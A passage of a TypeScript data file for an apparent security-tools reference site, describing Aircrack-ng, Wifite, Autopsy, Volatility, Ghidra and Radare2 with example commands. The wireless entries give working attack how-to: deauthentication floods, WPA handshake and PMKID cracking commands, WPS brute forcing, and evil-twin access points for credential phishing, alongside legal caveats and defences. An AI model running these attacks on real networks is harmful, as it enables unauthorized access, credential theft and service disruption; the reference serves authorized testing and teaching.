(injection test)\n• Deauth: -0 count (deauthentication)\n• Fake Auth: -1 delay (associate with AP)\n• ARP Replay: -3 (replay ARP packets for WEP)\n• Chopchop: -4 (decrypt WEP packet)\n• Fragment: -5 (fragment attack)\n• Caffe Latte: -6 (clientless WEP attack)\n• Target: -a BSSID (access point)\n• Client: -c MAC (specific client)\n• Deauth Count: -0 0 (unlimited)\n\nDeauthentication Attacks:\n• Capture Handshake: Force reconnection\n• Denial of Service: Continuous deauth\n• Targeted: -c CLIENT_MAC (specific client)\n• Broadcast: Deauth all clients\n• Continuous: -0 0 (infinite)\n• Burst: -0 5 (5 packets)\n• Legal Use: Only on authorized networks\n\nWPA/WPA2 Handshake Capture:\n1. Start airodump-ng on target channel\n2. Wait for client connection or\n3. Force reconnection with deauth\n4. Look for \"WPA handshake\" message\n5. Need all 4-way handshake packets\n6. Requires active client\n\nWEP Cracking:\n• Requirements: Capture IVs (initialization vectors)\n• Data Needed: 40-bit WEP = 250K IVs, 104-bit = 1M IVs\n• Active Attack: ARP replay to generate traffic\n• Passive: Wait for enough data packets\n• PTW Attack: aircrack-ng -z (faster, fewer packets)\n• Dictionary: aircrack-ng -w wordlist (if passphrase)\n• Time: Minutes with active attack\n\nWPA/WPA2-PSK Cracking:\n• Requires: Valid 4-way handshake\n• Method: Dictionary/brute force attack\n• Command: aircrack-ng -w wordlist.txt -b BSSID file.cap\n• ESSID: -e \"NetworkName\" (if multiple networks)\n• Speed: CPU-dependent, slow (1000-10000 keys/sec)\n• GPU: Use hashcat for GPU acceleration (much faster)\n• Time: Hours to never (depends on password)\n\nWPA3 Considerations:\n• SAE: Simultaneous Authentication of Equals\n• Dragonfly: Handshake replacement\n• Harder: Resistant to offline dictionary attacks\n• Downgrade: May force WPA2 on dual-mode APs\n• Tools: Limited support as of 2024\n\nPMKID Attack (WPA/WPA2):\n• Alternative: No client needed\n• Capture: PMKID from EAPOL frame\n• Tool: hcxdumptool + hcxtools\n• Hashcat: Mode 22000 for cracking\n• Advantage: Clientless WPA attack\n• Defense: Disable roaming features\n\nWPS Attacks:\n• Pixie Dust: Weak random number generation\n• Brute Force: Try all 8-digit PINs\n• Tools: Reaver, Bully\n• Time: 4-10 hours (brute force)\n• Detection: --wps flag in airodump-ng\n• Defense: Disable WPS\n\nFake Access Point (airbase-ng):\n• Evil Twin: Clone legitimate AP\n• Captive Portal: Phishing for credentials\n• MITM: Intercept traffic\n• Command: airbase-ng -e \"FreeWiFi\" -c 6 wlan0mon\n• DHCP: Need DHCP server for clients\n• Bridge: Route traffic through internet\n\nAdvanced Techniques:\n• Fragmentation: Bypass packet size limits\n• MAC Spoofing: Impersonate trusted client\n• Channel Hopping: Scan all channels\n• Hidden SSID: --showack to reveal\n• Multiple Captures: Merge with mergecap\n• PMKID Capture: Alternative to 4-way handshake\n\nCracking Optimization:\n• Wordlists: rockyou.txt, crackstation\n• Rules: John/Hashcat rules for mutations\n• GPU Acceleration: Export to hashcat format\n• Rainbow Tables: Pre-computed (airolib-ng)\n• Distributed: cowpatty for clusters\n• Targeted: OSINT for company-specific terms\n\nOutput Formats:\n• .cap: Standard pcap format\n• .csv: Airodump summary (CSV)\n• .kismet.csv: Kismet compatible\n• .kismet.netxml: Kismet XML\n• .log.csv: GPS coordinates (if available)\n• Hashcat: -J for WPA handshakes\n\nBest Practices:\n• Authorization: Only test networks you own\n• Lab Environment: Practice on isolated networks\n• Legal Compliance: Know local laws (often illegal)\n• Documentation: Log all activities\n• Responsible Disclosure: Report vulnerabilities\n• Target Selection: Avoid production networks\n• Client Impact: Deauth causes service disruption\n• Range: Stay within property boundaries\n\nDefensive Measures:\n• Strong Passphrases: 15+ random characters\n• WPA3: Upgrade when possible\n• Disable WPS: Most common vulnerability\n• MAC Filtering: Limited effectiveness\n• Hidden SSID: Security through obscurity (weak)\n• Monitor: Detect deauth attacks\n• 802.11w: Management frame protection\n• Enterprise: WPA2-Enterprise (RADIUS)\n\nCommon Pitfalls:\n• Wrong Card: No monitor mode/injection support\n• Driver Issues: Need compatible drivers\n• Interference: 2.4GHz crowded band\n• Weak Signal: Too far from target\n• No Clients: Can't capture handshake\n• Insufficient IVs: Not enough WEP data\n• Weak Wordlist: Missing target password\n• Channel Hopping: Lock to target channel\n\nIntegration:\n• Wireshark: Analyze captures in detail\n• Hashcat: GPU-accelerated WPA cracking\n• John the Ripper: Alternative cracking\n• Kismet: Wireless network detection\n• Reaver/Bully: WPS attacks\n• Wifite: Automated aircrack-ng wrapper\n• Fluxion: Social engineering attacks\n• Cowpatty: WPA-PSK cracking\n\nReal-World Applications:\n• Penetration Testing: Authorized wireless auditing\n• Red Team: Assess wireless security posture\n• Security Research: Test encryption implementations\n• Compliance: Validate security controls\n• Forensics: Analyze wireless attacks\n• Training: Hands-on security education\n• Bug Bounty: Test wireless vulnerabilities\n\nLegal and Ethical Considerations:\n• Authorization: Written permission required\n• Illegal: Attacking networks without authorization\n• Penalties: Federal crimes (CFAA, wiretap laws)\n• Jamming: FCC violations (illegal in US)\n• Privacy: Client privacy protection\n• Responsible Use: Educational/authorized only\n• Disclosure: Report vulnerabilities properly",
        githubUrl: "https://github.com/aircrack-ng/aircrack-ng",
        tags: ["wireless", "WiFi", "WEP", "WPA", "cracking", "monitoring"]
      },
      {
        id: "wifite",
        name: "Wifite",
        description: "Automated wireless attack tool designed to simplify wireless penetration testing",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install wifite",
        usage: "Wifite is used to automate wireless network attacks, making it easier to audit networks",
        examples: [
          {
            title: "Basic scan and attack",
            code: "sudo wifite"
          },
          {
            title: "Target WPA networks only",
            code: "sudo wifite --wpa"
          },
          {
            title: "Target WEP networks only",
            code: "sudo wifite --wep"
          },
          {
            title: "Target WPS networks",
            code: "sudo wifite --wps"
          },
          {
            title: "Specify custom wordlist",
            code: "sudo wifite --dict /usr/share/wordlists/rockyou.txt"
          },
          {
            title: "Kill all interfering processes",
            code: "sudo wifite --kill"
          },
          {
            title: "Target specific network by BSSID",
            code: "sudo wifite -b AA:BB:CC:DD:EE:FF"
          },
          {
            title: "Set specific wireless interface",
            code: "sudo wifite -i wlan0"
          },
          {
            title: "Limit attack time per network",
            code: "sudo wifite --wpa --crack-timeout 60"
          },
          {
            title: "Filter by signal strength",
            code: "sudo wifite --pow 40"
          },
          {
            title: "Reaver WPS attack with timeout",
            code: "sudo wifite --wps --pixie --timeout 300"
          },
          {
            title: "Skip already cracked networks",
            code: "sudo wifite --skip-crack"
          }
        ],
        documentation: "Wifite2 is a Python-based automated wireless network auditing tool designed to streamline WiFi security testing. Created by derv82 and rewritten for Python 3, it's a wrapper around industry-standard tools (Aircrack-ng, Reaver, Bully) that simplifies wireless penetration testing with an intuitive menu-driven interface.\\n\\nCore Features:\\n• Automated Attacks: All-in-one wireless testing\\n• Multiple Encryption: WEP, WPA/WPA2-PSK, WPS support\\n• Smart Targeting: Automatic network selection\\n• Parallel Processing: Attack multiple targets\\n• Session Resumption: Continue interrupted attacks\\n• Minimal User Input: Mostly automated workflow\\n• Color-Coded Output: Easy status visualization\\n• Wordlist Support: Custom dictionary attacks\\n\\nSupported Attack Types:\\n• WPA/WPA2-PSK:\\n  • Handshake capture via deauth\\n  • Dictionary attack with aircrack-ng\\n  • Hashcat format export\\n  • PMKID attack (clientless)\\n• WEP:\\n  • Fragmentation attack\\n  • Chopchop attack\\n  • ARP replay attack\\n  • P0841 attack\\n  • Caffe Latte attack\\n• WPS:\\n  • Pixie Dust attack (fast)\\n  • Reaver brute force\\n  • Bully alternative\\n  • PIN checksum validation\\n\\nDependencies:\\n• Required: Aircrack-ng suite\\n• WPA: aircrack-ng (always available)\\n• WPS: Reaver or Bully\\n• Advanced: hcxdumptool, hcxpcapngtool (PMKID)\\n• Optional: Cowpatty, Pyrit (WPA acceleration)\\n• Monitor Mode: Compatible wireless card\\n\\nWorkflow:\\n1. Interface Setup: Auto-enable monitor mode\\n2. Network Discovery: Scan for targets\\n3. Target Selection: User chooses networks\\n4. Attack Execution: Automated attack chain\\n5. Credential Recovery: Dictionary or brute force\\n6. Results Saving: Store cracked passwords\\n\\nTarget Filtering:\\n• Encryption: --wep, --wpa, --wps\\n• Signal Strength: --pow N (minimum dBm)\\n• Channel: --channel N\\n• ESSID: -e \\\"NetworkName\\\"\\n• BSSID: -b MAC_ADDRESS\\n• Manufacturer: Filter by OUI\\n• Client Count: Networks with active clients\\n\\nAttack Configuration:\\n• WPA Options:\\n  • --dict: Custom wordlist\\n  • --crack-timeout: Max attack time\\n  • --pmkid: Enable PMKID attack\\n  • --no-deauth: Skip deauth packets\\n• WEP Options:\\n  • --require-fakeauth: Fake authentication\\n  • --wep-filter: Specific WEP attacks\\n  • --pps: Packets per second\\n• WPS Options:\\n  • --pixie: Pixie Dust attack only\\n  • --ignore-locks: Ignore WPS lock\\n  • --wps-pin: Try specific PIN\\n\\nOutput and Results:\\n• Cracked Passwords: Saved to cracked.txt\\n• Handshakes: .cap files for later cracking\\n• Session Files: Resume interrupted attacks\\n• Color Coding:\\n  • Green: Success\\n  • Red: Failure\\n  • Yellow: Important info\\n  • Blue: Status updates\\n\\nPMKID Attack:\\n• Clientless: No clients needed\\n• Fast: Capture PMKID from AP\\n• Modern: Works on many routers\\n• Hashcat: Export for GPU cracking\\n• Success Rate: Higher than traditional\\n• Detection: Harder to detect\\n\\nWPS Attacks:\\n• Pixie Dust:\\n  • Exploits weak RNG\\n  • Very fast (seconds/minutes)\\n  • Works on vulnerable routers\\n  • No brute force needed\\n• PIN Brute Force:\\n  • Try all possible PINs\\n  • ~11,000 attempts\\n  • 4-10 hours typically\\n  • Rate limiting common\\n  • AP lockout risk\\n\\nAdvantages:\\n• User-Friendly: Beginner accessible\\n• Comprehensive: Multiple attack vectors\\n• Automated: Minimal manual intervention\\n• Updated: Active development\\n• Python 3: Modern codebase\\n• Cross-Platform: Linux primarily\\n• Well-Documented: Clear help system\\n\\nLimitations:\\n• Dependency Heavy: Requires many tools\\n• Limited Customization: Less control than raw tools\\n• WPA Cracking: Still requires good wordlist\\n• WPS Success: Depends on router vulnerability\\n• False Hopes: Not all networks crackable\\n• Resource Intensive: Can drain laptop battery\\n\\nBest Practices:\\n• Get Authorization: Only test your networks\\n• Strong Wordlists: Use rockyou.txt or similar\\n• Monitor Progress: Check attack status\\n• Test WPS First: Often fastest method\\n• Client Presence: WPA needs active clients (unless PMKID)\\n• Battery: Use AC power for long attacks\\n• Multiple Attempts: Some attacks need retries\\n• Update Tools: Keep dependencies current\\n• Legal Compliance: Follow local laws\\n\\nCommon Issues:\\n• No Monitor Mode: Card doesn't support\\n• Missing Dependencies: Install all tools\\n• WPS Locked: Router locked after attempts\\n• No Handshake: Deauth not effective\\n• Slow WPA: Weak CPU, use Hashcat with GPU\\n• Interface Errors: Driver compatibility\\n• Root Required: Must run as sudo\\n\\nIntegration:\\n• Hashcat: Export for GPU cracking\\n• Aircrack-ng: Underlying attack engine\\n• Reaver/Bully: WPS attack tools\\n• Hcxdumptool: PMKID capture\\n• Custom Scripts: Extend functionality\\n• Wordlist Generators: Crunch, CeWL\\n\\nReal-World Applications:\\n• Home Network Testing: Audit personal WiFi\\n• Penetration Testing: Authorized wireless audits\\n• Security Training: Learn wireless security\\n• Red Team: Initial network access\\n• Compliance: Test security controls\\n• Research: Wireless security research\\n\\nDefensive Measures:\\n• Disable WPS: Primary vulnerability\\n• Strong Passphrases: 15+ random characters\\n• WPA3: Upgrade when possible\\n• MAC Filtering: Limited effectiveness\\n• Hide SSID: Minimal protection\\n• Monitor: Detect deauth attacks\\n• 802.11w: Management frame protection\\n\\nAlternatives:\\n• Airgeddon: Similar automation\\n• Fluxion: Evil twin attacks\\n• Linset: Social engineering focus\\n• WiFi-Pumpkin: Rogue AP framework\\n• EAPHammer: WPA-Enterprise attacks\\n• Raw Aircrack-ng: Full manual control\\n\\nLegal and Ethical:\\n• Authorization Required: Written permission only\\n• Illegal Activity: Unauthorized access is a crime\\n• Federal Penalties: CFAA violations serious\\n• Responsible Use: Educational/authorized only\\n• Privacy: Respect client privacy\\n• Disclosure: Report vulnerabilities properly",
        githubUrl: "https://github.com/derv82/wifite2",
        tags: ["wireless", "automation", "WPA", "WEP", "WPS"]
      }
    ]
  },
  {
    id: "forensics-tools",
    name: "Forensics Tools",
    description: "Tools for digital forensics and evidence collection",
    tools: [
      {
        id: "autopsy",
        name: "Autopsy",
        description: "Digital forensics platform for analyzing disk images and recovering files",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install autopsy",
        usage: "Autopsy is used for digital forensics investigations to recover and analyze evidence from disk images",
        examples: [
          {
            title: "Start Autopsy (GUI version)",
            code: "autopsy"
          },
          {
            title: "Create new case",
            code: "Case > New Case > Enter case details"
          },
          {
            title: "Add data source (disk image)",
            code: "Case > Add Data Source > Disk Image > Browse to .dd, .E01, or .vmdk file"
          },
          {
            title: "Run ingest modules",
            code: "Select modules (File Type, Extension Mismatch, Keyword Search, etc.) > Finish"
          },
          {
            title: "Keyword search",
            code: "Tools > Keyword Search > Enter keywords > Search"
          },
          {
            title: "Timeline analysis",
            code: "Tools > Timeline > Select time range > View events"
          },
          {
            title: "Extract file by hash",
            code: "Tools > File Search by MD5 Hash > Enter hash > Search"
          },
          {
            title: "View file metadata",
            code: "Select file > Content Viewer > Application tab"
          },
          {
            title: "Carve deleted files",
            code: "Ingest Modules > PhotoRec Carver > Run"
          },
          {
            title: "Analyze registry",
            code: "Navigate to SYSTEM/Software/SAM hives > Registry Viewer"
          },
          {
            title: "Extract email artifacts",
            code: "Ingest Modules > Email Parser > PST/OST/MBOX"
          },
          {
            title: "Web artifacts analysis",
            code: "Ingest Modules > Recent Activity > Browser history, cookies, downloads"
          },
          {
            title: "Generate HTML report",
            code: "Case > Generate Report > HTML Report > Select artifacts"
          },
          {
            title: "Export tagged files",
            code: "Right-click tagged files > Export Files"
          }
        ],
        documentation: "Autopsy is the premier open-source digital forensics platform developed by Basis Technology. Built on The Sleuth Kit (TSK) library, it provides a comprehensive GUI for examining disk images and mobile devices. Used by law enforcement, military, corporate investigators, and incident responders worldwide, Autopsy streamlines forensic analysis with powerful modules and an extensible architecture.\n\nCore Features:\n• Multi-Platform: Windows, Linux, macOS support\n• Disk Image Analysis: .dd, .img, .E01, .vmdk formats\n• File System Support: NTFS, FAT, exFAT, ext2/3/4, HFS+, APFS\n• Timeline Analysis: Temporal event correlation\n• Keyword Search: Content indexing and search\n• Hash Filtering: Known good/bad file detection\n• File Carving: Recover deleted files\n• Email Analysis: PST, OST, MBOX parsing\n• Registry Analysis: Windows registry examination\n• Web Artifacts: Browser history, cookies\n• Mobile Forensics: Android, iOS support\n• Reporting: HTML, Excel, PDF reports\n\nArchitecture:\n• Case Management: Organized investigation structure\n• Data Sources: Disk images, logical files, mobile\n• Ingest Modules: Automated analysis plugins\n• Content Viewer: Multiple file viewers\n• Result Viewer: Organized findings\n• Keyword Search: Solr-based indexing\n• Database: PostgreSQL or SQLite backend\n• Multi-User: Collaborative case analysis\n\nCase Management:\n• Create Case: Organize investigations\n• Multiple Data Sources: Add disks, devices\n• Case Settings: Configure options\n• Case Notes: Document findings\n• Tags: Label evidence\n• Bookmarks: Mark interesting items\n• Export: Package case for sharing\n• Archive: Long-term storage\n\nIngest Modules:\n• File Type Identification: MIME type detection\n• Extension Mismatch: Find renamed files\n• Embedded File Extractor: Archives, documents\n• PhotoRec Carver: Recover deleted files\n• Hash Lookup: NSRL, custom hash sets\n• Keyword Search: Index and search content\n• Email Parser: PST, OST, MBOX, EML\n• Encryption Detection: Identify encrypted files\n• Recent Activity: Web, OS artifacts\n• EXIF Parser: Image metadata\n• Android Analyzer: Mobile artifacts\n• Interesting Files: Predefined patterns\n• Central Repository: Cross-case correlation\n\nFile System Analysis:\n• Deleted Files: Recover deleted items\n• Slack Space: Examine unused sectors\n• Metadata: File attributes (MAC times)\n• $MFT Analysis: NTFS Master File Table\n• Journaling: File system logs\n• Alternate Data Streams: NTFS ADS\n• Directory Structure: Full tree view\n• Permissions: Access control lists\n\nTimeline Analysis:\n• Event Types:\n  • File Modified (M)\n  • File Accessed (A)\n  • File Created (C)\n  • File Changed (metadata)\n• Filters: Time range, event type, source\n• Clustering: Group related events\n• Visualization: Graphical timeline\n• Export: Timeline to CSV\n• Correlation: Link events across sources\n\nKeyword Search:\n• Indexing: Solr-based full-text search\n• Search Types:\n  • Exact Match: Literal strings\n  • Substring: Partial matches\n  • Regular Expressions: Pattern matching\n• Lists: Predefined keyword sets\n• Preview: In-context results\n• Export: Search results\n• Performance: Indexed for speed\n\nHash Analysis:\n• Hash Sets:\n  • NSRL: Known good files\n  • NIST: Reference Data Set\n  • Custom: Malware, contraband\n• Algorithms: MD5, SHA-1, SHA-256\n• Hash Database: Central repository\n• Import: CSV, EnCase, X-Ways\n• Match Detection: Automatic flagging\n• Use Cases: Filter OS files, find malware\n\nEmail Analysis:\n• Formats:\n  • PST: Outlook Personal Folders\n  • OST: Offline Outlook\n  • MBOX: Thunderbird, Unix mail\n  • EML: Individual messages\n• Extraction:\n  • Message content\n  • Attachments\n  • Headers\n  • Metadata\n• Search: Keyword search in emails\n• Viewing: Formatted message display\n\nWeb Artifacts:\n• Browser Support:\n  • Chrome\n  • Firefox\n  • Internet Explorer\n  • Edge\n  • Safari\n• Artifacts:\n  • History: URLs visited\n  • Cookies: Session data\n  • Downloads: File downloads\n  • Bookmarks: Saved links\n  • Form Data: Autofill\n  • Cache: Cached files\n• Timeline: Web activity chronology\n\nRegistry Analysis (Windows):\n• Hives:\n  • SYSTEM: Hardware config\n  • SOFTWARE: Installed apps\n  • SAM: User accounts\n  • NTUSER.DAT: User settings\n• Viewer: Registry viewer plugin\n• Recent Activity: MRU lists, recent files\n• Shellbags: Folder access\n• USB Devices: Connected devices\n• Network: Network configurations\n\nMobile Forensics:\n• Android:\n  • Logical extraction\n  • SMS messages\n  • Call logs\n  • Contacts\n  • App data\n  • SQLite databases\n• iOS:\n  • iTunes backups\n  • Property lists (plist)\n  • Photos, messages\n• Third-Party: Cellebrite, Oxygen integration\n\nFile Carving:\n• PhotoRec: Signature-based carving\n• File Types: 480+ formats\n• Deleted Files: Recover unallocated\n• Fragmented: Partial recovery\n• Limitations: Metadata may be lost\n• Output: Recovered files folder\n\nViewing Capabilities:\n• Application Viewer: Native rendering\n• Text Viewer: ASCII/Unicode\n• Hex Viewer: Binary data\n• Media: Images, videos\n• Strings: Extract text\n• Metadata: EXIF, document properties\n• Translation: Google Translate integration\n\nReporting:\n• HTML Report: Comprehensive findings\n• Excel Report: Tabular data\n• KML Report: Geolocation data\n• Body File: Timeline export\n• Custom: Select specific artifacts\n• Templates: Standardized reports\n• Attachments: Include files\n\nMulti-User Mode:\n• Collaboration: Team case analysis\n• PostgreSQL: Shared database\n• Concurrent Access: Multiple analysts\n• Message System: Team communication\n• Activity Logs: Audit trail\n• Permissions: Role-based access\n\nCentral Repository:\n• Purpose: Cross-case correlation\n• Data Types:\n  • File hashes\n  • Email addresses\n  • Phone numbers\n  • WiFi SSIDs\n  • USB devices\n• Notable Items: Flag recurring evidence\n• Previous Occurrences: Case history\n• PostgreSQL: Shared repository\n\nAdvanced Features:\n• Scripting: Python modules\n• Custom Ingest Modules: Java/Python\n• API: Programmatic access\n• Plugins: Extensible architecture\n• Data Source Processors: Custom formats\n• Content Viewers: Custom viewers\n• Result Viewers: Custom result displays\n\nBest Practices:\n• Write Blocker: Use for acquisition\n• Hash Verification: Verify image integrity\n• Documentation: Log all actions\n• Chain of Custody: Maintain evidence trail\n• Non-Destructive: Work on copies\n• Comprehensive Ingest: Run all relevant modules\n• Regular Saves: Backup case database\n• Hash Sets: Use NSRL to filter\n• Keyword Lists: Prepare searches\n• Report Regularly: Document findings\n\nWorkflows:\n• Initial Triage:\n  1. Create case\n  2. Add data source\n  3. Run basic ingest modules\n  4. Review file types\n  5. Keyword search\n• Deep Analysis:\n  1. Timeline analysis\n  2. Web artifacts\n  3. Email examination\n  4. Registry analysis\n  5. Carve deleted files\n• Reporting:\n  1. Tag evidence\n  2. Create bookmarks\n  3. Generate report\n  4. Export files\n\nIntegration:\n• The Sleuth Kit: Core library\n• Volatility: Memory forensics\n• Plaso: Timeline analysis\n• Bulk Extractor: Feature extraction\n• X-Ways: Export/import\n• EnCase: Hash set exchange\n• FTK: Cross-tool compatibility\n\nLimitations:\n• Performance: Large images slow\n• Memory: Resource intensive\n• Mobile: Limited compared to commercial\n• Encryption: Cannot break encryption\n• Learning Curve: Complex for beginners\n• Cloud Forensics: Limited cloud support\n\nReal-World Applications:\n• Criminal Investigations: Evidence discovery\n• Incident Response: Compromise analysis\n• Internal Investigations: Employee misconduct\n• E-Discovery: Legal proceedings\n• Malware Analysis: Infection forensics\n• Data Breach: Determine exfiltration\n• Litigation Support: Evidence collection\n\nLegal Considerations:\n• Chain of Custody: Maintain integrity\n• Documentation: Comprehensive notes\n• Court Admissibility: Forensically sound\n• Privacy: Handle PII appropriately\n• Authorization: Legal search warrant\n• Standards: Follow NIST guidelines\n• Expert Testimony: Explain findings",
        githubUrl: "https://github.com/sleuthkit/autopsy",
        tags: ["forensics", "disk image", "analysis", "evidence", "recovery"]
      },
      {
        id: "volatility",
        name: "Volatility",
        description: "Memory forensics framework for incident response and malware analysis",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install volatility",
        usage: "Volatility is used to extract digital artifacts from volatile memory (RAM) samples",
        examples: [
          {
            title: "Identify memory profile (Volatility 2)",
            code: "volatility -f memory.dmp imageinfo"
          },
          {
            title: "List running processes",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 pslist"
          },
          {
            title: "Process tree visualization",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 pstree"
          },
          {
            title: "Show network connections",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 netscan"
          },
          {
            title: "List loaded DLLs",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 dlllist -p 1234"
          },
          {
            title: "Command line arguments",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 cmdline"
          },
          {
            title: "Dump process memory",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 memdump -p 1234 -D output/"
          },
          {
            title: "Extract executable from memory",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 procdump -p 1234 -D output/"
          },
          {
            title: "Registry hives",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 hivelist"
          },
          {
            title: "Print specific registry key",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 printkey -K 'ControlSet001\\Services'"
          },
          {
            title: "List services",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 svcscan"
          },
          {
            title: "Scan for malware (malfind)",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 malfind"
          },
          {
            title: "Detect hidden processes",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 psxview"
          },
          {
            title: "List handles (files, registry, mutexes)",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 handles -p 1234"
          },
          {
            title: "Extract files from memory",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 filescan"
          },
          {
            title: "Dump file from memory",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 dumpfiles -Q 0x12345678 -D output/"
          },
          {
            title: "Timeline creation (timeliner)",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 timeliner --output=body > timeline.body"
          },
          {
            title: "Volatility 3 - List processes",
            code: "vol -f memory.dmp windows.pslist"
          },
          {
            title: "Volatility 3 - Network scan",
            code: "vol -f memory.dmp windows.netscan"
          },
          {
            title: "Volatility 3 - Dump process",
            code: "vol -f memory.dmp -o /output windows.pslist.PsList --pid 1234 --dump"
          }
        ],
        documentation: "Volatility is an advanced memory forensics framework that helps extract digital artifacts from volatile memory (RAM) samples. It is used for incident response, malware analysis, and general forensics investigations. The framework is written in Python and supports analysis of Windows, Linux, and macOS memory dumps.",
        githubUrl: "https://github.com/volatilityfoundation/volatility",
        tags: ["memory forensics", "RAM", "malware analysis", "incident response"]
      }
    ]
  },
  {
    id: "reverse-engineering",
    name: "Reverse Engineering",
    description: "Tools for analyzing compiled software and understanding its structure",
    tools: [
      {
        id: "ghidra",
        name: "Ghidra",
        description: "Software reverse engineering framework developed by NSA",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "Download from ghidra-sre.org",
        usage: "Ghidra is used to analyze compiled code and understand its functionality through decompilation",
        examples: [
          {
            title: "Start Ghidra",
            code: "ghidraRun"
          },
          {
            title: "Create new project",
            code: "File > New Project > Non-Shared Project > Choose location"
          },
          {
            title: "Import binary",
            code: "File > Import File > Select binary > Analyze? Yes"
          },
          {
            title: "Auto analyze (after import)",
            code: "Analysis > Auto Analyze > Select analyzers > Analyze"
          },
          {
            title: "Navigate to function",
            code: "Symbol Tree > Functions > Double-click function name"
          },
          {
            title: "View decompiled code",
            code: "Window > Decompile (or press Ctrl+E)"
          },
          {
            title: "Search for strings",
            code: "Search > For Strings > Set minimum length > Search"
          },
          {
            title: "Find cross-references",
            code: "Right-click function/variable > References > Show References to"
          },
          {
            title: "Rename function/variable",
            code: "Right-click > Rename Function (or press L key)"
          },
          {
            title: "Add comment",
            code: "Right-click instruction > Comments > Set Pre Comment (or press ;)"
          },
          {
            title: "View call graph",
            code: "Right-click function > References > Show Call Tree"
          },
          {
            title: "Compare functions",
            code: "Tools > Function Comparison"
          },
          {
            title: "Export to C header",
            code: "File > Export Program > C/C++ > Export"
          },
          {
            title: "Scripting - Python",
            code: "Window > Script Manager > New > Python > Write script"
          },
          {
            title: "Version tracking (compare binaries)",
            code: "Tools > Version Tracking > New Session"
          },
          {
            title: "Patch instruction",
            code: "Right-click instruction > Patch Instruction"
          },
          {
            title: "Batch import multiple files",
            code: "File > Batch Import"
          }
        ],
        documentation: "Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency. It includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, macOS, and Linux.",
        githubUrl: "https://github.com/NationalSecurityAgency/ghidra",
        tags: ["reverse engineering", "decompiler", "disassembler", "analysis"]
      },
      {
        id: "radare2",
        name: "Radare2",
        description: "Complete framework for reverse-engineering and analyzing binaries",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "sudo apt install radare2",
        usage: "Radare2 is used for disassembling, debugging, and analyzing binary files",
        examples: [
          {
            title: "Open binary",
            code: "r2 binary.exe"
          },
          {
            title: "Analyze all",
            code: "r2 binary.exe\n[0x00000000]> aaa"
          },
          {
            title: "Show functions",
            code: "r2 binary.exe\n[0x00000000]> afl"
          }
        ],
        documentation: "Radare2 is a complete framework for reverse-engineering and analyzing binaries. It's composed of a set of small utilities that can be used together or independently from the command line. It provides advanced features like binary diffing, binary patching, and scripted reverse engineering.",
        githubUrl: "https://github.com/radareorg/radare2",
        tags: ["reverse engineering", "disassembler", "debugger", "hexadecimal editor", "binary analysis"]
      }
    ]
  }
];

// Helper function to get all tools as a flat array
export const getAllTools = (): Tool[] => {
  return toolsCategories.flatMap(category => category.tools);
};

// Helper function to get a tool by ID
export const getToolById = (id: string): Tool | undefined => {
  return getAllTools().find(tool => tool.id === id);
};

// Helper function to get tools by category
export const getToolsByCategory = (categoryId: string): Tool[] => {
  const category = toolsCategories.find(cat => cat.id === categoryId);
  return category ? category.tools : [];
};

// Helper function to get a category by ID
export const getCategoryById = (id: string): ToolCategory | undefined => {
  return toolsCategories.find(category => category.id === id);
};

// Helper function to search tools
export const searchTools = (query: string): Tool[] => {
  if (!query.trim()) return [];

  const lowerQuery = query.toLowerCase().trim();

  return getAllTools().filter(tool =>
    tool.name.toLowerCase().includes(lowerQuery) ||
    tool.description.toLowerCase().includes(lowerQuery) ||
    (tool.tags && tool.tags.some(tag => tag.toLowerCase().includes(lowerQuery))) ||
    (tool.documentation && tool.documentation.toLowerCase().includes(lowerQuery))
  );
};
